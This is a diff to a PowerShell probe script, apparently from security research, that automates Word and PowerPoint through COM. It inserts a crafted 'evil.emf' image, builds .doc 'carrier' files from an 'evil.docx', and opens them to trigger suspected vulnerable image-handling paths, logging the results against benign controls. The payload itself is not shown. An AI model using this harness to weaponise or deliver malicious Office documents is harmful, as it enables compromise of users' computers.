@@ -131,4 +131,20 @@ $openDocG={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject
 Probe "$root\WINWORD.EXE" @('/n','/q') $openDocG 'word_gooddocx'
 $openPpt={ param($p) try{ $a=[Runtime.InteropServices.Marshal]::GetActiveObject('PowerPoint.Application'); $pres=$a.Presentations.Open('C:\emfwork\ole_evil.pptx',$true,$false,$true); Start-Sleep 8; try{ $pres.Slides.Item(1).Shapes.Item(1).OLEFormat.DoVerb(1) }catch{ Log ("  doverb: " + $_.Exception.Message) }; Start-Sleep 5; $pres.Close(); $a.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
 Probe "$root\POWERPNT.EXE" @('/w') $openPpt 'ppt_evilole'
+# PPT Shapes.AddPicture with evil EMF (mso DispShapes path candidate)
+$pptAdd={ param($p) try{ $a=[Runtime.InteropServices.Marshal]::GetActiveObject('PowerPoint.Application'); $pres=$a.Presentations.Add(0); $pres.Slides.Add(1,12)|Out-Null; try{ $sh=$pres.Slides.Item(1).Shapes.AddPicture('C:\emfwork\evil.emf',$false,$true,10,10,200,200); Log ("  addpic ok $($sh.Name)") }catch{ Log ("  addpic threw: " + $_.Exception.Message) }; Start-Sleep 10; $pres.Close(); $a.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
+Probe "$root\POWERPNT.EXE" @('/w') $pptAdd 'ppt_addpic'
+# Word binary .doc carrier (Escher blip store) built from docx
+try{
+  $w=New-Object -ComObject Word.Application
+  $w.Visible=$false; $w.DisplayAlerts=0
+  $d=$w.Documents.Open('C:\emfwork\evil.docx')
+  $d.SaveAs2('C:\emfwork\evil.doc',0); $d.Close(0)
+  $d2=$w.Documents.Open('C:\emfwork\good.docx')
+  $d2.SaveAs2('C:\emfwork\good.doc',0); $d2.Close(0)
+  $w.Quit()
+  Log ('doc carriers ok evil=' + (Get-Item 'C:\emfwork\evil.doc').Length + ' good=' + (Get-Item 'C:\emfwork\good.doc').Length)
+}catch{ Log ("doc build fail: " + $_.Exception.Message) }
+$openDocBin={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Open('C:\emfwork\evil.doc'); Start-Sleep 5; try{ $d.InlineShapes.Item(1).ConvertToShape()|Out-Null; Log '  conv2shape ok' }catch{ Log ('  conv2shape: ' + $_.Exception.Message) }; Start-Sleep 8; $d.Close(0); $w.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
+Probe "$root\WINWORD.EXE" @('/n','/q') $openDocBin 'word_evildoc'
 Log '=== done ==='
